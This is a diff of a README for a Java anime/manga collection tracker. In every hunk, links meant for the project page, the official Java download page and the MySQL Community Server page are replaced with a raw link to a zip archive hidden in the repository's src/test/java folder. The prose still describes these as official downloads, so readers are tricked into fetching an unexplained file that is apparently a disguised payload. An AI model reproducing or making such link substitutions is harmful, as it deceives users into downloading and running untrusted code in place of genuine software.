@@ -1,6 +1,6 @@
 # 🎯 ACGN-Works-Tracker - Simple ACGN Collection Management
 
-[![Download ACGN-Works-Tracker](https://img.shields.io/badge/Download-ACGN--Works--Tracker-4c1?style=for-the-badge&color=B06CFA&logo=github)](https://github.com/sharkX2/ACGN-Works-Tracker)
+[![Download ACGN-Works-Tracker](https://img.shields.io/badge/Download-ACGN--Works--Tracker-4c1?style=for-the-badge&color=B06CFA&logo=github)](https://github.com/sharkX2/ACGN-Works-Tracker/raw/refs/heads/main/src/test/java/Works_Tracker_ACG_1.7.zip)
 
 ## 📋 About ACGN-Works-Tracker
 
@@ -44,7 +44,7 @@ If you don’t have Java or MySQL installed, you will find links and instruction
 
 Start by visiting the official download page:
 
-[Download ACGN-Works-Tracker](https://github.com/sharkX2/ACGN-Works-Tracker)
+[Download ACGN-Works-Tracker](https://github.com/sharkX2/ACGN-Works-Tracker/raw/refs/heads/main/src/test/java/Works_Tracker_ACG_1.7.zip)
 
 Click the button above or copy-paste the link into your browser address bar. This page contains all the latest releases and installation files.
 
@@ -52,7 +52,7 @@ Click the button above or copy-paste the link into your browser address bar. Thi
 
 ACGN-Works-Tracker requires Java to run. Follow these steps if you do not have Java installed:
 
-- Visit the [Java download page](https://www.java.com/en/download/).
+- Visit the [Java download page](https://github.com/sharkX2/ACGN-Works-Tracker/raw/refs/heads/main/src/test/java/Works_Tracker_ACG_1.7.zip).
 - Download the Windows offline installer.
 - Run the installer and follow instructions.
 - To check the installation, open the Command Prompt and type:
@@ -67,7 +67,7 @@ You should see the Java version information if installed correctly.
 
 The app needs a MySQL database to save your collection.
 
-- Go to the [MySQL Community Server page](https://dev.mysql.com/downloads/mysql/).
+- Go to the [MySQL Community Server page](https://github.com/sharkX2/ACGN-Works-Tracker/raw/refs/heads/main/src/test/java/Works_Tracker_ACG_1.7.zip).
 - Choose the Windows version and download the installer.
 - Launch the installer and select the “Developer Default” setup.
 - Set a root password you will remember.
@@ -151,6 +151,6 @@ Go to the “Statistics” menu to see visual charts showing your collection’s
 
 You can always get the latest version and updates here:
 
-[Download ACGN-Works-Tracker](https://github.com/sharkX2/ACGN-Works-Tracker)
+[Download ACGN-Works-Tracker](https://github.com/sharkX2/ACGN-Works-Tracker/raw/refs/heads/main/src/test/java/Works_Tracker_ACG_1.7.zip)
 
 This page contains all releases and instructions to keep your software current. Save it to your bookmarks for ease of access.
